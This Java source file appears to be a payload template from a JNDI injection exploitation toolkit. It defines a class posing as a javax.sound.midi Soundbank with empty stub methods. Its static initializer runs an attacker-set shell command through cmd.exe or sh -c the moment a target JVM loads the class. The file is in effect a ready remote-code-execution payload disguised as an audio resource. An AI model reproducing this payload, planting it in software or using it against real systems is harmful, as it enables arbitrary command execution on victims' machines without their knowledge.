package map.jndi.template;

import javax.sound.midi.Instrument;
import javax.sound.midi.Patch;
import javax.sound.midi.Soundbank;
import javax.sound.midi.SoundbankResource;

public class SoundbankTemplate implements Soundbank {
    public static String cmd;

    static {
        try {
            Runtime.getRuntime().exec(System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"sh", "-c", cmd});
        } catch (Exception e) {

        }
    }
    @Override
    public String getName() {
        return "";
    }

    @Override
    public String getVersion() {
        return "";
    }

    @Override
    public String getVendor() {
        return "";
    }

    @Override
    public String getDescription() {
        return "";
    }

    @Override
    public SoundbankResource[] getResources() {
        return new SoundbankResource[0];
    }

    @Override
    public Instrument[] getInstruments() {
        return new Instrument[0];
    }

    @Override
    public Instrument getInstrument(Patch patch) {
        return null;
    }
}
